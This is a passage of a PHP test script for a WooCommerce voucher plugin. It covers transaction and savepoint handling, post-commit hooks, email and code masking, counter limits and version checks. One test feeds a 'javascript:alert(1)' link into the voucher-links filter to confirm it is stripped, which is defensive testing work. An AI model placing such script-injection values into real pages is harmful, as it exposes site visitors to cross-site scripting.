	public function supports( string $code ): bool { return true; }
	public function lookup( string $code ) { return array(); }
	public function reserve( string $code, float $amount, \WC_Order $order ) { return array(); }
	public function commit( string $code, \WC_Order $order ) { return array(); }
	public function release( string $code, \WC_Order $order ) { return array(); }
};
check( 'D15: an untyped provider written against the 1.1 contract still implements the interface', $d15_legacy instanceof VCAP\Contracts\RedemptionProvider );
echo "D6 event timing (actions after COMMIT)\n";
if ( ! function_exists( 'do_action_ref_array' ) ) {
	function do_action_ref_array( $hook, $args ) { do_action( $hook, ...$args ); }
}
if ( ! function_exists( 'wc_get_logger' ) ) {
	function wc_get_logger() {
		return new class() {
			public function log( $level, $message, $context = array() ) { $GLOBALS['vcap_test_logged'][] = array( $level, $message, $context ); }
		};
	}
}
$GLOBALS['vcap_test_logged'] = array();
VCAP\Logger::error( 'Mail to jane.doe@example.com failed: SMTP 550 jane.doe@example.com unknown', array( 'to' => 'Jane <jane.doe@example.com>', 'order_id' => 7, 'nested' => array( 'cc' => 'bob@example.org' ) ) );
$m100_entry = $GLOBALS['vcap_test_logged'][0] ?? array( '', '', array() );
check( 'M12-100: the logger masks email addresses in the message and in the context values', ! str_contains( wp_json_encode( $m100_entry ), 'jane.doe@' ) && ! str_contains( wp_json_encode( $m100_entry ), 'bob@' ) && str_contains( (string) $m100_entry[1], 'j***@example.com' ) && 7 === ( $m100_entry[2]['order_id'] ?? null ) && 'voucher-captain' === ( $m100_entry[2]['source'] ?? '' ), wp_json_encode( $m100_entry ) );
/** Database double for D6: records queries; COMMIT can be refused. */
final class VCAP_D6_Wpdb {
	public string $prefix     = 'wp_';
	public string $last_error = '';
	public int $insert_id     = 1;
	public bool $refuse_commit = false;
	public bool $savepoint_gone = false;
	public array $log         = array();
	public function query( $q ) { $this->log[] = $q; return ( $this->refuse_commit && 'COMMIT' === $q ) || ( $this->savepoint_gone && str_starts_with( $q, 'ROLLBACK TO SAVEPOINT' ) ) ? false : 1; }
	public function update( ...$a ) { return 1; }
	public function insert( ...$a ) { return 1; }
	public function prepare( $q, ...$a ) { return $q; }
	public function get_var( $q ) { return null; }
	public function get_row( $q, $o = null ) { return null; }
	public function get_results( $q, $o = null ) { return array(); }
	public function get_col( $q, $i = 0 ) { return array(); }
}
$d6_saved_wpdb   = $GLOBALS['wpdb'] ?? null;
$GLOBALS['wpdb'] = new VCAP_D6_Wpdb();
VCAP\Db::reset();
$d6_seen = array();
add_action( 'vcap_d6_test', static function ( $value ) use ( &$d6_seen ) { $d6_seen[] = $value; } );

VCAP\Db::action( 'vcap_d6_test', 'now' );
check( 'D6: outside a transaction an action fires immediately', array( 'now' ) === $d6_seen );

$d6_seen = array();
VCAP\Db::begin();
VCAP\Db::action( 'vcap_d6_test', 'a' );
$d6_before = $d6_seen;
VCAP\Db::commit();
check( 'D6: an action is not visible to listeners before COMMIT and fires once after it', array() === $d6_before && array( 'a' ) === $d6_seen && array( 'START TRANSACTION', 'COMMIT' ) === $GLOBALS['wpdb']->log );

$d6_seen              = array();
$GLOBALS['wpdb']->log = array();
VCAP\Db::begin();
VCAP\Db::action( 'vcap_d6_test', 'gone' );
VCAP\Db::rollback_if_error( 'd6_test' );
VCAP\Db::begin();
VCAP\Db::commit();
check( 'D6: an action of a rolled back transaction is never fired (not even with the next COMMIT)', array() === $d6_seen && array( 'START TRANSACTION', 'ROLLBACK', 'START TRANSACTION', 'COMMIT' ) === $GLOBALS['wpdb']->log );

$d6_seen              = array();
$GLOBALS['wpdb']->log = array();
VCAP\Db::begin();
VCAP\Db::action( 'vcap_d6_test', 'outer' );
VCAP\Db::begin();
VCAP\Db::action( 'vcap_d6_test', 'inner' );
VCAP\Db::commit();
$d6_after_inner = $d6_seen;
VCAP\Db::begin();
VCAP\Db::action( 'vcap_d6_test', 'undone' );
VCAP\Db::rollback_silently();
$d6_open = VCAP\Db::in_transaction();
VCAP\Db::commit();
check( 'D6: nested helper calls use savepoints and dispatch at the outermost COMMIT (an inner ROLLBACK drops only its own actions)', array() === $d6_after_inner && $d6_open && array( 'outer', 'inner' ) === $d6_seen && ! VCAP\Db::in_transaction() && array( 'START TRANSACTION', 'SAVEPOINT vcap_sp_1', 'RELEASE SAVEPOINT vcap_sp_1', 'SAVEPOINT vcap_sp_1', 'ROLLBACK TO SAVEPOINT vcap_sp_1', 'COMMIT' ) === $GLOBALS['wpdb']->log, implode( ' | ', $GLOBALS['wpdb']->log ) );

// A listener that opens its own transaction runs after the outer COMMIT: its START TRANSACTION can no longer
// commit the outer one implicitly, and its own actions follow its own COMMIT.
$d6_seen              = array();
$GLOBALS['wpdb']->log = array();
add_action(
	'vcap_d6_tx_listener',
	static function () {
		$GLOBALS['vcap_d6_open_in_listener'] = VCAP\Db::in_transaction();
		VCAP\Db::begin();
		VCAP\Db::action( 'vcap_d6_test', 'from listener' );
		VCAP\Db::commit();
	}
);
VCAP\Db::begin();
VCAP\Db::action( 'vcap_d6_tx_listener' );
VCAP\Db::action( 'vcap_d6_test', 'outer' );
VCAP\Db::commit();
check( 'D6: a listener starting its own transaction runs after the outer COMMIT and no longer commits the outer one', false === $GLOBALS['vcap_d6_open_in_listener'] && array( 'START TRANSACTION', 'COMMIT', 'START TRANSACTION', 'COMMIT' ) === $GLOBALS['wpdb']->log && array( 'from listener', 'outer' ) === $d6_seen, implode( ' | ', $GLOBALS['wpdb']->log ) . ' / ' . implode( ',', $d6_seen ) );

// A refused COMMIT keeps the level open for the caller's rollback; nothing is dispatched.
$d6_seen                         = array();
$GLOBALS['wpdb']->log            = array();
$GLOBALS['wpdb']->refuse_commit  = true;
VCAP\Db::begin();
VCAP\Db::action( 'vcap_d6_test', 'lost' );
$d6_committed = VCAP\Db::commit();
$d6_still     = VCAP\Db::in_transaction();
VCAP\Db::rollback_if_error( 'd6_test' );
$GLOBALS['wpdb']->refuse_commit = false;
check( 'D6: a failed COMMIT dispatches nothing and leaves the rollback to the caller', ! $d6_committed && $d6_still && ! VCAP\Db::in_transaction() && array() === $d6_seen && 'ROLLBACK' === end( $GLOBALS['wpdb']->log ) );

// Db::transaction(): true commits, false rolls back, an exception rolls back and is thrown again.
$d6_seen              = array();
$GLOBALS['wpdb']->log = array();
$d6_ok                = VCAP\Db::transaction( static function () { VCAP\Db::action( 'vcap_d6_test', 'tx' ); return true; }, 'd6' );
$d6_no                = VCAP\Db::transaction( static function () { VCAP\Db::action( 'vcap_d6_test', 'no' ); return false; }, 'd6' );
$d6_thrown            = false;
try {
	VCAP\Db::transaction( static function () { VCAP\Db::action( 'vcap_d6_test', 'boom' ); throw new RuntimeException( 'boom' ); }, 'd6' );
} catch ( RuntimeException $e ) {
	$d6_thrown = true;
}
check( 'D6: Db::transaction() commits on true, rolls back on false or an exception (actions only after the commit)', $d6_ok && ! $d6_no && $d6_thrown && array( 'tx' ) === $d6_seen && ! VCAP\Db::in_transaction() && array( 'START TRANSACTION', 'COMMIT', 'START TRANSACTION', 'ROLLBACK', 'START TRANSACTION', 'ROLLBACK' ) === $GLOBALS['wpdb']->log, implode( ' | ', $GLOBALS['wpdb']->log ) );

// A listener that throws after the COMMIT is logged; the others still run (the data is committed).
$d6_seen                     = array();
$GLOBALS['vcap_test_logged'] = array();
add_action( 'vcap_d6_throws', static function () { throw new RuntimeException( 'listener failed' ); } );
VCAP\Db::begin();
VCAP\Db::action( 'vcap_d6_throws' );
VCAP\Db::action( 'vcap_d6_test', 'after' );
$d6_commit = VCAP\Db::commit();
check( 'D6: a listener failing after COMMIT is logged and does not stop the other listeners', $d6_commit && array( 'after' ) === $d6_seen && 1 === count( $GLOBALS['vcap_test_logged'] ) && str_contains( $GLOBALS['vcap_test_logged'][0][1], 'listener failed' ) );

// Repository hooks: vcap_voucher_updated / vcap_voucher_event wait for the COMMIT and get the state of the call.
$d6_updates = array();
$d6_events  = array();
add_action( 'vcap_voucher_updated', static function ( $v ) use ( &$d6_updates ) { $d6_updates[] = $v->balance; } );
add_action( 'vcap_voucher_event', static function ( $id, $event ) use ( &$d6_events ) { $d6_events[] = $event; }, 10, 2 );
$d6_repo             = new VCAP\VoucherRepository();
$d6_voucher          = new VCAP\Voucher();
$d6_voucher->id      = 7;
$d6_voucher->balance = 40.0;
VCAP\Db::begin();
$d6_repo->update( $d6_voucher );
$d6_repo->log( 7, 'redeemed', 10.0, 30.0, 'test' );
$d6_voucher->balance = 30.0;
$d6_repo->update( $d6_voucher );
$d6_mid = array( $d6_updates, $d6_events );
VCAP\Db::commit();
VCAP\Db::begin();
$d6_repo->update( $d6_voucher );
$d6_repo->log( 7, 'voided' );
VCAP\Db::rollback_silently();
check( 'D6: vcap_voucher_updated and vcap_voucher_event fire after the COMMIT (each with the voucher as saved then), never after a ROLLBACK', array( array(), array() ) === $d6_mid && array( 40.0, 30.0 ) === $d6_updates && array( 'redeemed' ) === $d6_events, var_export( array( $d6_updates, $d6_events ), true ) );
$d6_sources = implode( "\n", array_map( 'file_get_contents', array_merge( glob( VCAP_PATH . 'src/Coupons/*.php' ), array( VCAP_PATH . 'src/CouponManager.php', VCAP_PATH . 'src/API/V1/RedemptionService.php', VCAP_PATH . 'src/StoreCredit.php', VCAP_PATH . 'src/VoucherRepository.php', VCAP_PATH . 'src/Install.php' ) ) ) );
check( 'D6: every transaction in src runs through the shared helper (no raw START TRANSACTION / COMMIT / ROLLBACK)', ! preg_match( "/query\\( '(START TRANSACTION|COMMIT|ROLLBACK)' \\)/", $d6_sources ) );

// M12-05: outside a transaction a throwing listener is logged as well; the booking that fired it is done.
VCAP\Db::reset();
$d6_seen                     = array();
$GLOBALS['vcap_test_logged'] = array();
$m12_05_thrown               = false;
try {
	VCAP\Db::action( 'vcap_d6_throws' );
	VCAP\Db::action_ref_array( 'vcap_d6_throws', array( 1 ) );
	VCAP\Db::after_commit( static function () { throw new RuntimeException( 'after commit failed' ); } );
	VCAP\Db::action( 'vcap_d6_test', 'still' );
} catch ( Throwable $e ) {
	$m12_05_thrown = true;
}
check( 'M12-05: Db::action(), action_ref_array() and after_commit() catch and log a throwing listener at depth 0 too', ! $m12_05_thrown && array( 'still' ) === $d6_seen && 3 === count( $GLOBALS['vcap_test_logged'] ) && str_contains( $GLOBALS['vcap_test_logged'][2][1], 'after commit failed' ), var_export( $GLOBALS['vcap_test_logged'], true ) );

// M12-04: a deadlock inside a savepoint rolls back the whole transaction (InnoDB): the outer levels can only be rolled
// back, no action of any level is fired, nothing is committed by a later COMMIT and the next transaction is normal.
foreach ( array( 'deadlock error' => 'error', 'savepoint gone' => 'savepoint' ) as $m12_04_case => $m12_04_how ) {
	VCAP\Db::reset();
	$d6_seen              = array();
	$GLOBALS['wpdb']->log = array();
	VCAP\Db::begin();
	VCAP\Db::action( 'vcap_d6_test', 'outer' );
	VCAP\Db::begin();
	VCAP\Db::action( 'vcap_d6_test', 'inner' );
	if ( 'error' === $m12_04_how ) {
		$GLOBALS['wpdb']->last_error = 'Deadlock found when trying to get lock; try restarting transaction';
	} else {
		$GLOBALS['wpdb']->savepoint_gone = true;
	}
	VCAP\Db::rollback_silently();
	$GLOBALS['wpdb']->last_error     = '';
	$GLOBALS['wpdb']->savepoint_gone = false;
	$m12_04_open     = VCAP\Db::in_transaction();
	$m12_04_nested   = VCAP\Db::begin();
	$m12_04_commit   = VCAP\Db::commit();
	VCAP\Db::rollback_silently();
	$m12_04_closed   = ! VCAP\Db::in_transaction();
	$m12_04_log      = $GLOBALS['wpdb']->log;
	VCAP\Db::begin();
	VCAP\Db::action( 'vcap_d6_test', 'next' );
	$m12_04_next = VCAP\Db::commit();
	$m12_04_rest = array_slice( $GLOBALS['wpdb']->log, count( $m12_04_log ) );
	$m12_04_expect = 'error' === $m12_04_how
		? array( 'START TRANSACTION', 'SAVEPOINT vcap_sp_1', 'ROLLBACK', 'START TRANSACTION', 'ROLLBACK' )
		: array( 'START TRANSACTION', 'SAVEPOINT vcap_sp_1', 'ROLLBACK TO SAVEPOINT vcap_sp_1', 'ROLLBACK', 'START TRANSACTION', 'ROLLBACK' );
	check( "M12-04: a deadlock in a savepoint ({$m12_04_case}) leaves Db consistent: outer level open but not committable, its actions dropped, the next transaction normal", $m12_04_open && ! $m12_04_nested && ! $m12_04_commit && $m12_04_closed && $m12_04_expect === $m12_04_log && $m12_04_next && array( 'START TRANSACTION', 'COMMIT' ) === $m12_04_rest && array( 'next' ) === $d6_seen, implode( ' | ', $GLOBALS['wpdb']->log ) . ' / ' . implode( ',', $d6_seen ) );
}
$m12_04_sources = implode( "\n", array_map( 'file_get_contents', array( VCAP_PATH . 'src/Coupons/Balances.php', VCAP_PATH . 'src/API/V1/RedemptionService.php', VCAP_PATH . 'src/StoreCredit.php' ) ) );
check( 'M12-04: bookings read the voucher with get_for_update() (no "SELECT id … FOR UPDATE" followed by a plain get()), the charge state with a locking read', ! preg_match( '/SELECT id FROM \{\$(table|tables\[\'vouchers\'\])\} WHERE id = %d FOR UPDATE/', $m12_04_sources ) && substr_count( $m12_04_sources, 'get_for_update(' ) >= 10 && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Coupons/Balances.php' ), "' LOCK IN SHARE MODE'" ) );
VCAP\Db::reset();
$GLOBALS['wpdb'] = $d6_saved_wpdb;
echo "R6 tills, counter limits and add-on hooks\n";
$r6_note = VCAP\Tickets::counter_note( 'Lunch', '4711', 'Shop 1' );
check( 'R6: till and receipt are read back from a counter note written before schema 1.8.0 (English and German labels)', array( 'till' => 'Shop 1', 'receipt' => '4711' ) === VCAP\Counter::parse_note( $r6_note ) && array( 'till' => 'Filiale Graz', 'receipt' => 'B-12' ) === VCAP\Counter::parse_note( 'Im Laden eingelöst · Beleg B-12 · Kasse Filiale Graz' ) && array( 'till' => '', 'receipt' => '' ) === VCAP\Counter::parse_note( 'Redeemed in store' ) && array( 'till' => '', 'receipt' => '' ) === VCAP\Counter::parse_note( VCAP\Note::make( 'delivered', array( 1 ) ) ), var_export( VCAP\Counter::parse_note( $r6_note ), true ) );
$r6_none  = VCAP\Counter::exceeded( array( 'amount' => 0.0, 'count' => 0 ), array( 'count' => 99, 'amount' => 9999.0 ), 500.0 );
$r6_fits  = VCAP\Counter::exceeded( array( 'amount' => 100.0, 'count' => 3 ), array( 'count' => 2, 'amount' => 60.0 ), 40.0 );
$r6_amt   = VCAP\Counter::exceeded( array( 'amount' => 100.0, 'count' => 0 ), array( 'count' => 2, 'amount' => 60.0 ), 40.01 );
$r6_cnt   = VCAP\Counter::exceeded( array( 'amount' => 0.0, 'count' => 3 ), array( 'count' => 3, 'amount' => 0.0 ), 0.0 );
check( 'R6: daily limits: 0 = unlimited, exactly reaching the limit fits, one cent above is refused with what is left, the count limit counts this redemption', null === $r6_none && null === $r6_fits && 'amount' === $r6_amt['kind'] && 40.0 === $r6_amt['left'] && 'count' === $r6_cnt['kind'] && 0.0 === $r6_cnt['left'], var_export( array( $r6_fits, $r6_amt, $r6_cnt ), true ) );
check( 'R6: the scanner message names the limit and what is left', str_contains( VCAP\Counter::limit_message( 'till', 'Shop 1', $r6_cnt, 'EUR' ), '"Shop 1"' ) && str_contains( VCAP\Counter::limit_message( 'user', '', $r6_cnt, 'EUR' ), 'left: 0' ) );
check( 'R6: counter limits are off by default (0 = unlimited)', 0 === VCAP\Settings::defaults()[ VCAP\Counter::USER_AMOUNT ] && 0 === VCAP\Settings::defaults()[ VCAP\Counter::USER_COUNT ] && 0 === VCAP\Settings::defaults()[ VCAP\Counter::TILL_AMOUNT ] && 0 === VCAP\Settings::defaults()[ VCAP\Counter::TILL_COUNT ] );
$r6_head = VCAP\Ledger::journal_header();
$r6_line = VCAP\Ledger::journal_line( array( 'created_at' => '2026-11-14 10:00:00', 'code' => 'ABC', 'type' => 'giftcard', 'currency' => 'EUR', 'event' => 'redeemed', 'amount' => 5, 'balance_after' => 10, 'order_id' => 0, 'till' => 'Shop 1', 'receipt' => '4711', 'note' => 'x' ) );
check( 'R6: the journal CSV has its own till/branch and receipt columns', 'Shop 1' === $r6_line[ array_search( 'Till / branch', $r6_head, true ) ] && '4711' === $r6_line[ array_search( 'Receipt no.', $r6_head, true ) ] && count( $r6_head ) === count( $r6_line ) );
check( 'R6: the counter report CSV groups by till, staff member or both', array( 'Till / branch', 'Staff member' ) === array_slice( VCAP\Ledger::counter_header( 'both' ), 0, 2 ) && 'Currency' === VCAP\Ledger::counter_header( 'user' )[1] && 'Till / branch' === VCAP\Ledger::counter_header( 'till' )[0] );
$r6_v         = new VCAP\Voucher();
$r6_v->status = VCAP\Voucher::STATUS_ACTIVE;
add_filter(
	'vcap_voucher_links',
	static fn( $links, $voucher, $context ) => array_merge( $links, array( array( 'label' => '<b>Add to Wallet</b>', 'url' => 'https://wallet.example/' . $context ), array( 'label' => 'Bad', 'url' => 'javascript:alert(1)' ), array( 'label' => '', 'url' => 'https://x.example/' ), 'junk' ) ),
	10,
	3
);
$r6_links = VCAP\Downloads::voucher_links( $r6_v, 'email' );
$r6_v->status = VCAP\Voucher::STATUS_VOID;
check( 'R6: vcap_voucher_links: only labelled http(s) links are kept, as plain text; none for a cancelled voucher', array( array( 'label' => 'Add to Wallet', 'url' => 'https://wallet.example/email' ) ) === $r6_links && array() === VCAP\Downloads::voucher_links( $r6_v, 'account' ), var_export( $r6_links, true ) );
unset( $GLOBALS['vcap_test_filters']['vcap_voucher_links'] );
$r6_src = (string) file_get_contents( dirname( __DIR__ ) . '/src/VoucherRepository.php' );
check( 'R6: vcap_voucher_event passes the source and the acting user id as trailing arguments (WF-02: then the ledger row)', str_contains( $r6_src, "Db::action( 'vcap_voucher_event', \$voucher_id, \$event, \$amount, \$balance_after, Note::render( \$note ), \$order_id, \$source, (int) \$row['user_id'], \$entry )" ) );
check( 'R6: the admin menu fires vcap_admin_menu with its parent slug', str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/src/Admin/Menu.php' ), "do_action( 'vcap_admin_menu', 'vcap-vouchers' )" ) );
check( 'R6: schema 1.8.0 adds the ledger columns till and receipt, migrated after 1.7.0', '1.8.0' === VCAP\Install::EVENT_TILL_VERSION && preg_match( "/define\\( 'VCAP_DB_VERSION', '([0-9.]+)' \\)/", (string) file_get_contents( dirname( __DIR__ ) . '/voucher-captain.php' ), $r6_db ) && version_compare( $r6_db[1], '1.8.0', '>=' ) && str_contains( (string) file_get_contents( dirname( __DIR__ ) . '/src/Install.php' ), "till varchar(100) NOT NULL DEFAULT ''" ) );

echo "D14 coupon sync and code masking\n";
$d14_u = static fn( string $mode, string $status, int $limit, int $count ) => CouponManager::coupon_usage_for( $mode, $status, $limit, $count );
check(
	'D14: one usage rule – redeemed = used up, active single-use = exactly one use left, balance untouched',
	array( 1, 1 ) === $d14_u( 'single', Voucher::STATUS_REDEEMED, 1, 0 )
		&& array( 2, 2 ) === $d14_u( 'single', Voucher::STATUS_REDEEMED, 1, 2 )
		&& array( 2, 1 ) === $d14_u( 'single', Voucher::STATUS_ACTIVE, 1, 1 )
		&& array( 1, 0 ) === $d14_u( 'single', Voucher::STATUS_ACTIVE, 5, 0 )
		&& array( 1, 0 ) === $d14_u( 'single', Voucher::STATUS_RESERVED, 1, 0 )
		&& array( 11, 10 ) === $d14_u( 'unlimited', Voucher::STATUS_ACTIVE, 10, 10 )
		&& array( 10, 3 ) === $d14_u( 'unlimited', Voucher::STATUS_ACTIVE, 10, 3 )
		&& array( 0, 0 ) === $d14_u( 'unlimited', Voucher::STATUS_ACTIVE, 0, 0 )
		&& array( 0, 4 ) === $d14_u( 'balance', Voucher::STATUS_REDEEMED, 0, 4 )
);
check( 'D14: coupon status per voucher status (void/scheduled off, active on, others unchanged)', false === CouponManager::coupon_enabled_for( Voucher::STATUS_VOID ) && false === CouponManager::coupon_enabled_for( Voucher::STATUS_SCHEDULED ) && true === CouponManager::coupon_enabled_for( Voucher::STATUS_ACTIVE ) && null === CouponManager::coupon_enabled_for( Voucher::STATUS_REDEEMED ) && null === CouponManager::coupon_enabled_for( Voucher::STATUS_EXPIRED ) );
$d14_writers = array();
foreach ( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( dirname( __DIR__ ) . '/src', FilesystemIterator::SKIP_DOTS ) ) as $d14_file ) {
	$d14_src = (string) file_get_contents( (string) $d14_file );
	// Voucher coupons are written by CouponManager only (create_coupon/sync_coupon, in src/Coupons since the split:
	// CouponFactory and CouponSync); other coupons (bonus, referral, campaign, first order, SKU rules) are not voucher coupons.
	if ( preg_match( '/->set_usage_limit\(|->set_usage_count\(|->set_date_expires\(/', $d14_src ) && ! preg_match( '#/(CouponManager|Coupons/CouponFactory|Coupons/CouponSync|Reissue|Referrals|Discounts/Bonus|Campaigns|FirstOrderCoupons|CouponSkuRules)\.php$#', (string) $d14_file ) ) {
		$d14_writers[] = basename( (string) $d14_file );
	}
}
check( 'D14: no other class sets usage limit/count or expiry on a voucher coupon (all through CouponManager::sync_coupon)', array() === $d14_writers, implode( ', ', $d14_writers ) );
check(
	'D14: one masking helper – codes "…" + last four in capitals (whole characters), addresses "j***@domain"; the old names are aliases',
	'…7KQ2' === VCAP\Mask::code( 'gift-ab7kq2' ) && '7KQ2' === VCAP\Mask::code_tail( 'gift-ab7kq2' ) && '…ÄÖÜÉ' === VCAP\Mask::code( 'x-äöüé' ) && '…AB' === VCAP\Mask::code( 'ab' )
		&& 'j***@example.com' === VCAP\Mask::email( 'jane@example.com' ) && 'no address' === VCAP\Mask::email( 'no address' ) && 'Ä***@b.de' === VCAP\Mask::email( 'Äxy@b.de' )
		&& 'Mail to j***@example.com and b***@test.org failed' === VCAP\Mask::addresses( 'Mail to jane@example.com and bob@test.org failed' )
		&& VCAP\Downloads::masked_code( 'abc-12345' ) === VCAP\Mask::code( 'abc-12345' ) && VCAP\Compat\PassCaptainTickets::mask_email( 'x@y.z' ) === VCAP\Mask::email( 'x@y.z' ) && VCAP\Health::mask_addresses( 'a@b.cd' ) === VCAP\Mask::addresses( 'a@b.cd' )
);
$d14_maskers = array();
foreach ( new RecursiveIteratorIterator( new RecursiveDirectoryIterator( dirname( __DIR__ ) . '/src', FilesystemIterator::SKIP_DOTS ) ) as $d14_file ) {
	// "code_hint" (Pass Captain contract payload) keeps the code's own case on purpose: it is not a display mask.
	$d14_lines = preg_grep( "/(mb_)?substr\\([^;]*-4\\b|'\\*\\*\\*@'/", (array) file( (string) $d14_file ) );
	if ( array_filter( $d14_lines, static fn( $l ) => ! str_contains( $l, "'code_hint'" ) ) && ! str_ends_with( (string) $d14_file, '/Mask.php' ) ) {
		$d14_maskers[] = basename( (string) $d14_file );
	}
}
check( 'D14: no class masks codes or addresses on its own (all through VCAP\Mask)', array() === $d14_maskers, implode( ', ', $d14_maskers ) );
$d14_core = (string) file_get_contents( dirname( __DIR__ ) . '/src/Health.php' ) . (string) file_get_contents( dirname( __DIR__ ) . '/src/Diagnostics.php' );
check( 'D14: Site Health and the diagnostics no longer reference src/Compat classes (inverted through filters)', ! preg_match( '/Compat\\\\[A-Z]/', $d14_core ) );
// Owner decision 16.11.2026: PHP 8.5, MySQL 9.7 / MariaDB 12.3 for all Captain plugins; an older database is only reported.
$db_health = new VCAP\Health();
$db_old    = $db_health->test_database( '5.5.5-10.11.6-MariaDB-0ubuntu0.24.04.1' );
$db_ok     = $db_health->test_database( '12.3.1-MariaDB-ubu2404' );
$db_mysql  = $db_health->test_database( '8.4.3' );
check(
	'PHP 8.5 / WordPress 7.0 / WooCommerce 11.2.2 / MySQL 9.7 / MariaDB 12.3: header, readme and load checks agree; the database version is read for MySQL and MariaDB (replication prefix skipped) and an older server is only a recommendation, never critical',
	str_contains( (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' ), ' * Requires PHP:      8.5' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' ), "version_compare( PHP_VERSION, '8.5', '<' )" ) && str_contains( (string) file_get_contents( VCAP_PATH . 'readme.txt' ), "Requires PHP: 8.5\n" )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' ), ' * Requires at least: 7.0' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' ), ' * WC requires at least: ' . VCAP\Plugin::MIN_WC_VERSION ) && '11.2.2' === VCAP\Plugin::MIN_WC_VERSION && str_contains( (string) file_get_contents( VCAP_PATH . 'readme.txt' ), "Requires at least: 7.0\n" ) && str_contains( (string) file_get_contents( VCAP_PATH . 'readme.txt' ), 'WC requires at least: ' . VCAP\Plugin::MIN_WC_VERSION . "\n" )
		&& array( 'type' => 'mariadb', 'version' => '10.11.6' ) === VCAP\Health::parse_db_server( '5.5.5-10.11.6-MariaDB-0ubuntu0.24.04.1' ) && array( 'type' => 'mysql', 'version' => '9.7.0' ) === VCAP\Health::parse_db_server( '9.7' ) && null === VCAP\Health::parse_db_server( 'unknown' )
		&& 'recommended' === $db_old['status'] && str_contains( $db_old['description'], 'MariaDB 10.11.6' ) && 'good' === $db_ok['status'] && 'recommended' === $db_mysql['status'] && 'good' === $db_health->test_database( 'garbage' )['status'],
	wp_json_encode( array( $db_old['status'], $db_ok['status'], $db_mysql['status'] ) )
);
// MINVER-1: the declared minimums decide with an injected version (local runs use an older PHP than 8.5, so the
// running PHP is never what is checked here). The load check in voucher-captain.php compares PHP_VERSION with the
// header's "Requires PHP"; WordPress refuses the activation below "Requires at least" / "Requires PHP" itself.
$minver_main = (string) file_get_contents( VCAP_PATH . 'voucher-captain.php' );
preg_match( "/version_compare\( PHP_VERSION, '([0-9.]+)', '<' \)/", $minver_main, $minver_guard );
preg_match( '/^ \* Requires PHP:\s*(\S+)$/m', $minver_main, $minver_php );
preg_match( '/^ \* Requires at least:\s*(\S+)$/m', $minver_main, $minver_wp );
$minver_refused = static fn( string $running, string $minimum ): bool => version_compare( $running, $minimum, '<' );
check( 'MINVER-1: the load check uses the declared PHP minimum: PHP 8.4 is refused, PHP 8.5 and 8.6 load', '8.5' === ( $minver_guard[1] ?? '' ) && ( $minver_php[1] ?? '' ) === $minver_guard[1] && $minver_refused( '8.4.14', $minver_guard[1] ) && ! $minver_refused( '8.5.0', $minver_guard[1] ) && ! $minver_refused( '8.6.0', $minver_guard[1] ) );
check( 'MINVER-1: the declared WordPress minimum refuses 6.9 and accepts 7.0; WooCommerce 11.2.0 and 11.2.1 are refused (woocommerce#70637), 11.2.2 accepted', '7.0' === ( $minver_wp[1] ?? '' ) && $minver_refused( '6.9.4', $minver_wp[1] ) && ! $minver_refused( '7.0', $minver_wp[1] ) && version_compare( '11.2.0', VCAP\Plugin::MIN_WC_VERSION, '<' ) && version_compare( '11.2.1', VCAP\Plugin::MIN_WC_VERSION, '<' ) && version_compare( '11.2.2', VCAP\Plugin::MIN_WC_VERSION, '>=' ) );
$minver_composer = json_decode( (string) file_get_contents( VCAP_PATH . 'composer.json' ), true );
$minver_lock     = json_decode( (string) file_get_contents( VCAP_PATH . 'composer.lock' ), true );
check( 'MINVER-1: composer.json and composer.lock declare PHP 8.5 (require, platform)', '>=8.5' === ( $minver_composer['require']['php'] ?? '' ) && '8.5.0' === ( $minver_composer['config']['platform']['php'] ?? '' ) && '>=8.5' === ( $minver_lock['platform']['php'] ?? '' ) && '8.5.0' === ( $minver_lock['platform-overrides']['php'] ?? '' ) );
check( 'MINVER-1: an old database server only gives a recommendation, with the minimum named (MySQL 8.4 / MariaDB 11.4 → recommended; MySQL 9.7 / MariaDB 12.3 → good)', 'recommended' === $db_health->test_database( '11.4.5-MariaDB' )['status'] && 'good' === $db_health->test_database( '9.7.0' )['status'] && 'good' === $db_health->test_database( '12.3.0-MariaDB' )['status'] && str_contains( $db_mysql['description'], 'MySQL 9.7 or newer' ) );
$d14_filters = $GLOBALS['vcap_test_filters'] ?? array();
unset( $GLOBALS['vcap_test_filters']['vcap_currency_health'] );
$d14_plain = ( new VCAP\Health() )->test_currency();
( new VCAP\Compat\MultiCurrency() )->register();
$GLOBALS['vcap_test_options'][ VCAP\Compat\MultiCurrency::UNKNOWN_OPTION ] = array( 'CZK' => time() );
$d14_compat = ( new VCAP\Health() )->test_currency();
$GLOBALS['vcap_test_filters'] = $d14_filters;
unset( $GLOBALS['vcap_test_options'][ VCAP\Compat\MultiCurrency::UNKNOWN_OPTION ] );
check( 'D14: the currency check reads the state the currency integration registers (critical with a refused currency, good without the integration)', 'good' === $d14_plain['status'] && 'critical' === $d14_compat['status'] && str_contains( wp_json_encode( $d14_compat ), 'CZK' ), wp_json_encode( array( $d14_plain['status'], $d14_compat['status'] ) ) );

echo "Audit panel package D (lifecycle, async work, performance)\n";
// AP-Q2-6: filter callbacks accept whatever the previous filter returned.
$q26_callbacks = array( array( VCAP\Downloads::class, 'query_vars' ), array( VCAP\Downloads::class, 'menu_item' ), array( VCAP\Emails::class, 'classes' ), array( VCAP\ProductSettings::class, 'type_option' ), array( VCAP\ProductSettings::class, 'tab' ), array( VCAP\Compat\Subscriptions::class, 'type_option_classes' ), array( VCAP\Settings::class, 'add_tab' ), array( VCAP\Plugin::class, 'action_links' ), array( VCAP\Privacy::class, 'exporters' ), array( VCAP\Privacy::class, 'erasers' ) );
$q26_typed     = array_values( array_filter( $q26_callbacks, static fn( $c ) => null !== ( new ReflectionMethod( $c[0], $c[1] ) )->getParameters()[0]->getType() ) );
$q26_downloads = ( new ReflectionClass( VCAP\Downloads::class ) )->newInstanceWithoutConstructor();
( new ReflectionProperty( VCAP\Downloads::class, 'settings' ) )->setValue( $q26_downloads, new VCAP\Settings() );
$GLOBALS['vcap_test_options']['vcap_myaccount_tab'] = 'yes';
$q26_vars  = $q26_downloads->query_vars( null );
$q26_menu  = $q26_downloads->menu_item( 'broken' );
$q26_tabs  = ( new VCAP\ProductSettings() )->tab( false );
$q26_types = ( new VCAP\ProductSettings() )->type_option( '' );
